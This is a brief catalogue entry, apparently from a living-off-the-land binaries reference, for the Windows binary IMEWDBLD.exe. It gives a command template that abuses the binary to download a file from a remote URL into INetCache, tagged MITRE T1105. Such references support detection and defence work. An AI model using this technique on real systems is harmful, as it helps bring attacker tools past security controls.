title: IMEWDBLD.exe
html:
IMEWDBLD.exe

Microsoft IME Open Extended Dictionary Module

Download

Download file from Internet

C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL}

IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to INetCache. — MITRE: T1105 — Privileges: User
